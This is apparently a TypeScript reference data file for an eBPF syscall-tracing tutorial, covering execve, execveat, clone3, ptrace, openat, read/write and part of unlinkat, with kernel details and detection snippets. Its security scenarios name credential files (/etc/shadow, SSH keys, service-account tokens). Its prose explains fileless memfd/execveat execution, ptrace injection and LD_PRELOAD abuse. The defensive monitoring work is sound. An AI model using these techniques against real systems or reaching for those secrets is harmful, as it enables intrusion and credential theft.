import { SyscallReferenceItem } from '../types/ebpf';

export const TRACEABLE_SYSCALLS: SyscallReferenceItem[] = [
  // ============================================================================
  // PROCESS & EXECUTION SUBSYSTEM
  // ============================================================================
  {
    id: 'sys-execve',
    syscallNumberX86_64: 59,
    name: 'execve',
    category: 'Process & Execution',
    cSignature: 'int execve(const char *pathname, char *const argv[], char *const envp[]);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_execve")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_execve")',
    fentryHook: 'SEC("fentry/__x64_sys_execve")',
    lsmAlternative: 'SEC("lsm/bprm_check_security")',
    shortSummary:
      'Replaces the current process virtual memory image with a new executable binary (ELF or interpreter script) while preserving the existing PID.',
    whatItDoesInDetail: [
      'When a shell, container runtime, or service spawns a command, it first clones a child process via clone()/fork() and then invokes execve() inside the child. Unlike fork(), execve() does NOT create a new PID—instead, it tears down the calling thread’s existing virtual memory address space (heap, stack, and code segments) and maps a brand-new binary into memory.',
      'Inside the kernel, sys_execve delegates to do_execveat_common(), which allocates a struct linux_binprm, opens the target file via the VFS layer, reads the first 256 bytes of the file header to identify the binary format (e.g., ELF magic bytes 0x7f454c46 or a #! shebang script interpreter), flushes all old signal handlers, and updates current->comm to the basename of the new binary.',
      'Because the old user-space memory mappings are destroyed during execve execution, user-space pointer arguments (pathname, argv, envp) are ONLY guaranteed to exist in the old address space at sys_enter_execve. By the time sys_exit_execve fires, the old user pointers have been unmapped and replaced by the new process stack.'
    ],
    kernelInternalsAndStructures: [
      'struct linux_binprm (holds file*, cred*, filename, argc, envc during binary loading)',
      'current->mm (struct mm_struct — completely replaced via exec_mmap() during execution)',
      'current->comm (16-byte process short name updated only AFTER the new binary header is parsed)',
      'current->fs & current->files (close-on-exec O_CLOEXEC file descriptors are closed)'
    ],
    howToTraceInEbpf: [
      'Attach to SEC("tracepoint/syscalls/sys_enter_execve") to capture the target binary path (ctx->args[0]) and command-line arguments array (ctx->args[1]) BEFORE the kernel tears down the caller’s virtual memory space.',
      'Because ctx->args[0] is a const char __user * pointer living in user-space virtual memory, you MUST read it with bpf_probe_read_user_str(event->filename, sizeof(event->filename), (const char *)ctx->args[0]).',
      'To read argv[0..N], first read the user pointer at &argv[i] using bpf_probe_read_user(&argp, sizeof(argp), &argv[i]), and then read the string at argp using bpf_probe_read_user_str(). Always bound your loop with #pragma unroll or a constant upper bound (e.g. i < 8) so the eBPF Verifier proves termination.'
    ],
    pointerAndVerifierGotchas: [
      'NEVER call bpf_get_current_comm() in sys_enter_execve expecting the new program name! At sys_enter_execve, current->comm still holds the parent shell name (e.g., "bash" or "sh"). Read ctx->args[0] for the new binary or hook sched/sched_process_exec.',
      'Demand-paging fault risk: if the caller allocated argv[] in a memory page that has not been touched yet, non-sleepable bpf_probe_read_user() returns -EFAULT. Use SEC("tp_btf/...") or sleepable fentry.s/bprm_check_security if zero-fault tolerance is required.',
      'TOCTOU Security Warning: a malicious thread in the same process can overwrite the user-space pathname buffer between sys_enter_execve and the kernel’s VFS lookup. For security blocking, attach to SEC("lsm/bprm_check_security") and inspect bprm->file.'
    ],
    returnValuesAndErrnos: {
      successMeaning:
        'In user space, execve() never returns on success because the calling program image is overwritten. However, the kernel tracepoint sys_exit_execve DOES fire with ret == 0 when the new binary is ready to jump to its ELF entry point.',
      commonErrors: [
        { errno: '-ENOENT (-2)', reason: 'Executable file or its dynamic linker (/lib64/ld-linux-x86-64.so.2) does not exist.' },
        { errno: '-EACCES (-13)', reason: 'Execute permission is denied on the file or a directory in its path prefix, or noexec mount.' },
        { errno: '-ENOEXEC (-8)', reason: 'Binary header magic is unrecognized and lacks a valid #! interpreter line.' },
        { errno: '-E2BIG (-7)', reason: 'Total size of argv[] + envp[] strings exceeds ARG_MAX.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'pathname',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'Null-terminated user-space string path to the executable binary (e.g. "/usr/bin/curl").'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'argv',
        cType: 'const char *const __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user() + bpf_probe_read_user_str()',
        detailedMeaning: 'Null-terminated array of user-space string pointers representing command-line arguments.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'envp',
        cType: 'const char *const __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user() + bpf_probe_read_user_str()',
        detailedMeaning: 'Null-terminated array of KEY=VALUE environment variable pointers (e.g. LD_PRELOAD).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Container Drift & Living-Off-The-Land Detection',
        scenario: 'Detecting when an immutable Kubernetes container suddenly executes /bin/sh, curl, wget, or chmod.'
      },
      {
        title: 'LD_PRELOAD Rootkit & Environment Auditing',
        scenario: 'Inspecting envp[] during sys_enter_execve to catch attackers injecting malicious shared libraries via LD_PRELOAD.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve_enter(struct trace_event_raw_sys_enter *ctx) {
    struct exec_event *ev = bpf_ringbuf_reserve(&events, sizeof(*ev), 0);
    if (!ev) return 0;

    ev->pid = bpf_get_current_pid_tgid() >> 32;
    ev->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    bpf_get_current_comm(&ev->parent_comm, sizeof(ev->parent_comm));

    const char *filename_ptr = (const char *)ctx->args[0];
    bpf_probe_read_user_str(&ev->filename, sizeof(ev->filename), filename_ptr);

    bpf_ringbuf_submit(ev, 0);
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_execve", objs.TraceExecveEnter, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_execve: %v", err)
}
defer tp.Close()`,
    relatedTutorialId: 'tut-beg-01-execve'
  },

  {
    id: 'sys-execveat',
    syscallNumberX86_64: 322,
    name: 'execveat',
    category: 'Process & Execution',
    cSignature:
      'int execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_execveat")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_execveat")',
    fentryHook: 'SEC("fentry/__x64_sys_execveat")',
    lsmAlternative: 'SEC("lsm/bprm_check_security")',
    shortSummary:
      'Executes a program relative to an open directory file descriptor—or directly from an anonymous in-memory file descriptor when AT_EMPTY_PATH is set.',
    whatItDoesInDetail: [
      'execveat() extends execve() by accepting a directory file descriptor (dirfd) and a flags bitmask. When pathname is relative, the kernel resolves it relative to dirfd instead of the process current working directory.',
      'Critically for security engineers, when flags includes AT_EMPTY_PATH (0x1000) and pathname is an empty string (""), the kernel executes the binary referenced directly by dirfd! This allows a process to create an anonymous RAM-backed file via memfd_create(), write an ELF payload into it over a network socket, and execute it via execveat(memfd, "", argv, envp, AT_EMPTY_PATH) without ever touching the disk filesystem.',
      'Because many naive monitoring tools only hook sys_enter_execve, attackers routinely use execveat() to bypass process-execution telemetry completely.'
    ],
    kernelInternalsAndStructures: [
      'do_execveat_common(int fd, struct filename *filename, ...)',
      'AT_EMPTY_PATH (0x1000) — instructs VFS lookup to use the open struct file* from dirfd directly',
      'struct file->f_path.dentry (shows "memfd:..." when backed by shmem anonymous memory)'
    ],
    howToTraceInEbpf: [
      'Always attach your process-execution tracer to BOTH sys_enter_execve AND sys_enter_execveat (or hook sched/sched_process_exec / lsm/bprm_check_security which unify both syscalls).',
      'Inspect ctx->args[0] (dirfd) and ctx->args[4] (flags). If (flags & 0x1000) != 0, flag the execution as a direct file-descriptor execution (potential fileless payload).'
    ],
    pointerAndVerifierGotchas: [
      'Notice the argument index shift compared to execve(): in execveat(), pathname is at ctx->args[1] (NOT args[0]!), argv is at ctx->args[2], envp is at ctx->args[3], and flags is at ctx->args[4].'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns 0 inside sys_exit_execveat when the new binary image replaces the calling process.',
      commonErrors: [
        { errno: '-EBADF (-9)', reason: 'dirfd is not a valid open file descriptor.' },
        { errno: '-EINVAL (-22)', reason: 'Invalid flags bitmask specified.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'dirfd',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Open directory FD, AT_FDCWD (-100), or executable file FD when AT_EMPTY_PATH is set.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'pathname',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'Relative path string, or empty string "" when executing dirfd directly.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'argv',
        cType: 'const char *const __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'User-space array of argument string pointers.'
      },
      {
        argIndex: 'ctx->args[3]',
        name: 'envp',
        cType: 'const char *const __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'User-space array of environment variable pointers.'
      },
      {
        argIndex: 'ctx->args[4]',
        name: 'flags',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Bitmask: AT_EMPTY_PATH (0x1000) or AT_SYMLINK_NOFOLLOW (0x100).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Fileless Malware Detection (memfd_create + execveat)',
        scenario: 'Catching in-memory ELF execution where attackers load an encrypted binary into a memfd and invoke execveat(fd, "", ..., AT_EMPTY_PATH).'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_execveat")
int trace_execveat(struct trace_event_raw_sys_enter *ctx) {
    __u32 dirfd = (__u32)ctx->args[0];
    const char *pathname = (const char *)ctx->args[1];
    __u32 flags = (__u32)ctx->args[4];

    // Detect AT_EMPTY_PATH (0x1000) fileless FD execution
    if (flags & 0x1000) {
        bpf_printk("ALERT: Fileless execveat on fd=%d pid=%d\\n",
                   dirfd, bpf_get_current_pid_tgid() >> 32);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_execveat", objs.TraceExecveat, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_execveat: %v", err)
}
defer tp.Close()`,
    relatedTutorialId: 'tut-adv-20-fileless'
  },

  {
    id: 'sys-clone3',
    syscallNumberX86_64: 435,
    name: 'clone3',
    category: 'Process & Execution',
    cSignature: 'long clone3(struct clone_args *cl_args, size_t size);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_clone3")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_clone3")',
    fentryHook: 'SEC("fentry/__x64_sys_clone3")',
    lsmAlternative: 'SEC("tp_btf/sched_process_fork")',
    shortSummary:
      'Modern extensible Linux system call used by glibc, Go runtime, and container runtimes (runc) to create processes, threads, and Linux namespaces.',
    whatItDoesInDetail: [
      'Modern Linux systems (glibc 2.34+, Go runtime, systemd, and container runtimes) use clone3() instead of legacy fork() or clone() to spawn both lightweight threads and full processes. It passes a pointer to an extensible user-space struct clone_args.',
      'Depending on the 64-bit cl_args->flags bitmask, clone3() either shares the parent’s virtual memory and file table (creating a thread via CLONE_VM | CLONE_THREAD | CLONE_FILES) or duplicates them using copy-on-write page tables (creating a new child process).',
      'Additionally, clone3() is the primary entry point for creating new Linux container namespaces when flags include CLONE_NEWNS, CLONE_NEWPID, CLONE_NEWNET, or CLONE_NEWUSER.'
    ],
    kernelInternalsAndStructures: [
      'struct kernel_clone_args (internal kernel copy of user struct clone_args)',
      'copy_process() (kernel function that allocates the child struct task_struct and assigns its PID/TGID)',
      'struct nsproxy (namespace pointers cloned or unshared when CLONE_NEW* flags are set)'
    ],
    howToTraceInEbpf: [
      'In sys_enter_clone3, ctx->args[0] is a struct clone_args __user * pointer. Read the first 8 bytes (the u64 flags field) using bpf_probe_read_user(&flags, sizeof(flags), (void *)ctx->args[0]).',
      'Check if (flags & CLONE_THREAD) is zero to distinguish new process creation from internal multi-threading, or check (flags & CLONE_NEWUSER) to detect unprivileged user-namespace creation.'
    ],
    pointerAndVerifierGotchas: [
      'Inside sys_exit_clone3, the syscall fires in the PARENT context with ret == child_pid. If you prefer not to dereference user pointers, hook SEC("tp_btf/sched_process_fork") where both parent and child task_struct pointers are directly verified kernel objects.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns the newly allocated child PID/TID (> 0) to the parent process inside sys_exit_clone3.',
      commonErrors: [
        { errno: '-EAGAIN (-11)', reason: 'RLIMIT_NPROC or cgroup pids.max limit reached (fork bomb mitigation).' },
        { errno: '-EPERM (-1)', reason: 'CLONE_NEW* namespace creation attempted without CAP_SYS_ADMIN.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'cl_args',
        cType: 'struct clone_args __user *',
        pointerSpace: 'USER_STRUCT_PTR (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'Pointer to user-space struct clone_args containing u64 flags, pidfd, stack, and cgroup FD.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'size',
        cType: 'size_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Byte size of struct clone_args passed by userspace (allows forward/backward ABI compatibility).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Unprivileged User Namespace Exploit Detection',
        scenario: 'Alerting when a non-root process calls clone3() with CLONE_NEWUSER | CLONE_NEWNET to gain fake root capabilities inside an isolated namespace.'
      },
      {
        title: 'Fork Bomb & Thread Exhaustion Profiling',
        scenario: 'Tracking per-cgroup process creation rates and -EAGAIN failures when a microservice hits pids.max.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_clone3")
int trace_clone3(struct trace_event_raw_sys_enter *ctx) {
    __u64 flags = 0;
    const void *cl_args_ptr = (const void *)ctx->args[0];

    // First field of struct clone_args is __aligned_u64 flags
    bpf_probe_read_user(&flags, sizeof(flags), cl_args_ptr);

    // 0x10000000 = CLONE_NEWUSER
    if (flags & 0x10000000ULL) {
        bpf_printk("CLONE_NEWUSER namespace created by pid=%d\\n",
                   bpf_get_current_pid_tgid() >> 32);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_clone3", objs.TraceClone3, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_clone3: %v", err)
}
defer tp.Close()`
  },

  {
    id: 'sys-ptrace',
    syscallNumberX86_64: 101,
    name: 'ptrace',
    category: 'Process & Execution',
    cSignature: 'long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_ptrace")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_ptrace")',
    fentryHook: 'SEC("fentry/__x64_sys_ptrace")',
    lsmAlternative: 'SEC("lsm/ptrace_access_check")',
    shortSummary:
      'Allows one process to attach to another process, inspect or modify its CPU registers and virtual memory, and intercept its system calls.',
    whatItDoesInDetail: [
      'ptrace() is the debugging substrate used by gdb, strace, and lldb—but it is also a primary post-exploitation technique used by attackers for process injection and credential theft.',
      'When a process invokes ptrace(PTRACE_ATTACH, target_pid, ...) or ptrace(PTRACE_POKETEXT, target_pid, addr, word), the kernel pauses the target task, verifies CAP_SYS_PTRACE and Yama ptrace_scope permissions, and directly reads or overwrites the target process memory pages or CPU general-purpose registers (PTRACE_SETREGS).',
      'Because every ptrace argument that matters for security (request type and target pid) is a plain scalar value in ctx->args[0] and ctx->args[1], tracing ptrace in eBPF requires zero user-memory pointer dereferences and is immune to TOCTOU races!'
    ],
    kernelInternalsAndStructures: [
      'ptrace_attach() & arch_ptrace() in kernel/ptrace.c',
      'child->ptrace (task_struct field marking that the task is currently being traced)',
      'security_ptrace_access_check() (LSM hook invoked before attaching)'
    ],
    howToTraceInEbpf: [
      'Attach to SEC("tracepoint/syscalls/sys_enter_ptrace") and read long request = ctx->args[0] and pid_t target_pid = (pid_t)ctx->args[1].',
      'Filter for high-risk request constants: PTRACE_ATTACH (16), PTRACE_SEIZE (0x4206), PTRACE_POKETEXT (4), PTRACE_POKEDATA (5), and PTRACE_SETREGS (13).'
    ],
    pointerAndVerifierGotchas: [
      'Both request (args[0]) and pid (args[1]) are scalar integers inside struct trace_event_raw_sys_enter—read them directly without bpf_probe_read_user().'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns 0 on success (or the read word for PTRACE_PEEK*).',
      commonErrors: [
        { errno: '-EPERM (-1)', reason: 'Target process cannot be traced due to Yama ptrace_scope or missing CAP_SYS_PTRACE.' },
        { errno: '-ESRCH (-3)', reason: 'Target PID does not exist.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'request',
        cType: 'long',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Operation code: PTRACE_ATTACH (16), PTRACE_POKETEXT (4), PTRACE_SETREGS (13).'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'pid',
        cType: 'pid_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Target process ID being inspected or injected.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'addr',
        cType: 'void *',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar address)',
        detailedMeaning: 'Target virtual address inside the tracee address space.'
      },
      {
        argIndex: 'ctx->args[3]',
        name: 'data',
        cType: 'void *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'Direct read / bpf_probe_read_user()',
        detailedMeaning: 'Word value written for POKETEXT or pointer to struct user_regs_struct.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Process Hollowing & Shellcode Injection Detection',
        scenario: 'Alerting immediately when any container process calls ptrace(PTRACE_ATTACH) or ptrace(PTRACE_POKETEXT) on sshd, kubelet, or another daemon.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_ptrace")
int trace_ptrace(struct trace_event_raw_sys_enter *ctx) {
    long request = ctx->args[0];
    __u32 target_pid = (__u32)ctx->args[1];
    __u32 caller_pid = bpf_get_current_pid_tgid() >> 32;

    // 16 = PTRACE_ATTACH, 4 = PTRACE_POKETEXT, 13 = PTRACE_SETREGS
    if (request == 16 || request == 4 || request == 13) {
        bpf_printk("SECURITY: pid %d called ptrace(req=%ld) on target=%d\\n",
                   caller_pid, request, target_pid);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_ptrace", objs.TracePtrace, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_ptrace: %v", err)
}
defer tp.Close()`
  },

  // ============================================================================
  // FILESYSTEM & VFS SUBSYSTEM
  // ============================================================================
  {
    id: 'sys-openat',
    syscallNumberX86_64: 257,
    name: 'openat / openat2',
    category: 'Filesystem & VFS',
    cSignature: 'int openat(int dirfd, const char *pathname, int flags, mode_t mode);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_openat")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_openat")',
    fentryHook: 'SEC("fentry/__x64_sys_openat")',
    lsmAlternative: 'SEC("lsm/file_open")',
    shortSummary:
      'Opens or creates a file or device relative to a directory file descriptor, allocating a new file descriptor in the process FD table.',
    whatItDoesInDetail: [
      'On modern 64-bit Linux (x86_64 and ARM64), glibc’s open() wrapper ALWAYS invokes the openat() (or openat2()) system call with dirfd = AT_FDCWD (-100) when opening a path relative to the current working directory. If you only hook legacy sys_enter_open, you will miss 99.9% of file opens!',
      'Inside the kernel, do_sys_openat2() copies the user-space pathname into a kernel struct filename via getname_flags(), allocates an unused integer file descriptor slot in current->files->fdt, and walks the VFS dentry cache (dcache) via path_openat() to resolve the target inode.',
      'Once the inode permissions are verified by the VFS and LSM hooks (security_file_open), the kernel initializes a struct file object linked to that inode and installs it into the process file descriptor table, returning the non-negative FD integer.'
    ],
    kernelInternalsAndStructures: [
      'struct filename (kernel buffer holding the copied path string)',
      'struct path (pair of struct vfsmount *mnt and struct dentry *dentry)',
      'struct file (created per open call; stores f_pos offset, f_flags, and f_inode pointer)',
      'current->files->fdt (process file descriptor table mapping int fd -> struct file *)'
    ],
    howToTraceInEbpf: [
      'Use a two-stage correlation pattern: in SEC("tracepoint/syscalls/sys_enter_openat"), read the user-space pathname from (const char *)ctx->args[1] via bpf_probe_read_user_str() and store it in a BPF_MAP_TYPE_HASH keyed by u64 pid_tgid.',
      'In SEC("tracepoint/syscalls/sys_exit_openat"), look up the stashed path by pid_tgid, read ctx->ret (which is the newly allocated FD if >= 0, or a negative -errno if failed), emit the combined event to your ring buffer, and delete the temporary map entry.'
    ],
    pointerAndVerifierGotchas: [
      'Always hook openat (and openat2), NOT legacy open (which does not even exist on ARM64 Linux!).',
      'For security enforcement (e.g., blocking reads of /etc/shadow or Kubernetes service-account tokens), use SEC("lsm/file_open") where the kernel has already resolved symlinks and relative paths into a canonical struct file *.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns the newly allocated non-negative file descriptor integer (e.g., 3, 4, 5) in sys_exit_openat->ret.',
      commonErrors: [
        { errno: '-ENOENT (-2)', reason: 'File does not exist and O_CREAT was not specified.' },
        { errno: '-EACCES (-13)', reason: 'Requested read/write access is denied by file mode or LSM policy.' },
        { errno: '-EMFILE (-24)', reason: 'Process has reached its RLIMIT_NOFILE open file descriptor limit.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'dirfd',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Directory FD or AT_FDCWD (-100) for current working directory.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'pathname',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'User-space pointer to the null-terminated file path string.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'flags',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Access mode & creation flags: O_RDONLY (0), O_WRONLY (1), O_RDWR (2), O_CREAT (0x40), O_TRUNC (0x200).'
      },
      {
        argIndex: 'ctx->args[3]',
        name: 'mode',
        cType: 'mode_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Permission bits (e.g. 0644) applied only when O_CREAT or O_TMPFILE is set.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Sensitive Credential & Secret Access Auditing',
        scenario: 'Monitoring processes opening /etc/shadow, ~/.ssh/id_rsa, /var/run/secrets/kubernetes.io/serviceaccount/token, or .env files.'
      },
      {
        title: 'Missing Config & Library Troubleshooting',
        scenario: 'Tracing openat calls where sys_exit_openat returns -ENOENT (-2) to immediately see which config file or .so library an application is failing to find.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_openat")
int trace_openat_enter(struct trace_event_raw_sys_enter *ctx) {
    char path[128];
    const char *user_path = (const char *)ctx->args[1];
    int flags = (int)ctx->args[2];

    bpf_probe_read_user_str(&path, sizeof(path), user_path);
    bpf_printk("openat path=%s flags=0x%x\\n", path, flags);
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_openat", objs.TraceOpenatEnter, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_openat: %v", err)
}
defer tp.Close()`,
    relatedTutorialId: 'tut-beg-04-openat-files'
  },

  {
    id: 'sys-read-write',
    syscallNumberX86_64: 0,
    name: 'read / write',
    category: 'Filesystem & VFS',
    cSignature: 'ssize_t read(int fd, void *buf, size_t count); // write is syscall #1',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_read")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_read")',
    fentryHook: 'SEC("fentry/ksys_read")',
    lsmAlternative: 'SEC("lsm/file_permission")',
    shortSummary:
      'Transfers up to count bytes between an open file descriptor (file, pipe, socket, or device) and a user-space memory buffer.',
    whatItDoesInDetail: [
      'read() (syscall #0) and write() (syscall #1) are the workhorse I/O system calls in Linux because "everything is a file descriptor"—regular disk files, TCP/Unix sockets, pipes, eventfds, and character devices all use read/write.',
      'Inside the kernel, ksys_read() looks up the struct file * from current->files using the integer fd, checks FMODE_READ permission, and dispatches to file->f_op->read_iter() (e.g., generic_file_read_iter for page-cache disk files or sock_read_iter for network sockets).',
      'Critical distinction between read() and write() when inspecting the payload buffer (ctx->args[1]): for write(), the user buffer ALREADY contains the data at sys_enter_write. For read(), the user buffer is EMPTY at sys_enter_read! The kernel only populates buf during the syscall, so you MUST stash the buf pointer at sys_enter_read and call bpf_probe_read_user() inside sys_exit_read (using ctx->ret as the actual number of bytes read).'
    ],
    kernelInternalsAndStructures: [
      'struct fd / struct file * (resolved via fdget_pos(fd) in fs/read_write.c)',
      'struct file_operations->read_iter / write_iter (polymorphic VFS dispatch table)',
      'struct address_space (page cache radix tree / XArray for buffered disk I/O)'
    ],
    howToTraceInEbpf: [
      'ALWAYS filter early by PID, TGID, UID, or target FD at the very top of a sys_enter_read / sys_enter_write program! Because your own Go userspace agent or SSH session invokes read/write, unfiltered tracing creates a feedback loop.',
      'To capture read() data payloads: save ctx->args[1] (void *buf) in a hash map at sys_enter_read. In sys_exit_read, if ctx->ret > 0, clamp the length (e.g. __u32 len = ctx->ret & 0x3FF) so the Verifier knows the read size is bounded, then call bpf_probe_read_user().'
    ],
    pointerAndVerifierGotchas: [
      'The eBPF Verifier requires a provably bounded size argument for bpf_probe_read_user(dst, size, src). Always mask dynamic byte counts (e.g., if (len > MAX_BUF) len = MAX_BUF; or len &= 0xFF) before passing len to bpf_probe_read_user().'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns the number of bytes actually transferred (> 0), or 0 on End-Of-File (EOF).',
      commonErrors: [
        { errno: '-EAGAIN / -EWOULDBLOCK (-11)', reason: 'Non-blocking socket or pipe has no data ready immediately.' },
        { errno: '-EBADF (-9)', reason: 'FD is invalid or not open for reading/writing.' },
        { errno: '-EINTR (-4)', reason: 'Blocked I/O call was interrupted by a signal before any bytes transferred.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'fd',
        cType: 'unsigned int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Open file descriptor index in the calling process FD table.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'buf',
        cType: 'char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'User-space destination buffer (for read, populated at sys_exit) or source buffer (for write, populated at sys_enter).'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'count',
        cType: 'size_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Maximum number of bytes requested to read or write.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'L7 Protocol Sniffing (HTTP / SQL / Redis over Sockets)',
        scenario: 'Inspecting read/write buffers on socket FDs to parse plaintext HTTP/1.1, Postgres SQL queries, or Redis commands without application code changes.'
      },
      {
        title: 'TTY Keystroke & Interactive Shell Auditing',
        scenario: 'Capturing commands typed into interactive bash/ssh sessions by monitoring read() on stdin/pty file descriptors (fd 0).'
      }
    ],
    cSnippet: `// Stash buffer pointer at sys_enter_read, read filled bytes at sys_exit_read
SEC("tracepoint/syscalls/sys_enter_read")
int trace_read_enter(struct trace_event_raw_sys_enter *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u64 buf_addr = (__u64)ctx->args[1];
    bpf_map_update_elem(&active_reads, &pid_tgid, &buf_addr, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int trace_read_exit(struct trace_event_raw_sys_exit *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u64 *buf_addr = bpf_map_lookup_elem(&active_reads, &pid_tgid);
    if (!buf_addr) return 0;

    if (ctx->ret > 0) {
        char sample[64] = {};
        __u32 to_copy = ctx->ret < 64 ? ctx->ret : 64;
        bpf_probe_read_user(&sample, to_copy & 0x3F, (const void *)*buf_addr);
    }
    bpf_map_delete_elem(&active_reads, &pid_tgid);
    return 0;
}`,
    goSnippet: `tpEnter, _ := link.Tracepoint("syscalls", "sys_enter_read", objs.TraceReadEnter, nil)
defer tpEnter.Close()
tpExit, _ := link.Tracepoint("syscalls", "sys_exit_read", objs.TraceReadExit, nil)
defer tpExit.Close()`
  },

  {
    id: 'sys-unlinkat',
    syscallNumberX86_64: 263,
    name: 'unlinkat',
    category: 'Filesystem & VFS',
    cSignature: 'int unlinkat(int dirfd, const char *pathname, int flags);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_unlinkat")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_unlinkat")',
    fentryHook: 'SEC("fentry/__x64_sys_unlinkat")',
    lsmAlternative: 'SEC("lsm/inode_unlink")',
    shortSummary:
      'Deletes a directory entry (filename link) from the filesystem, or removes a directory when AT_REMOVEDIR is set.',
    whatItDoesInDetail: [
      'When rm or rmdir is run—or when an application deletes a file—modern libc invokes unlinkat(). It removes the dentry link from the parent directory and decrements the target inode’s hard-link count (i_nlink).',
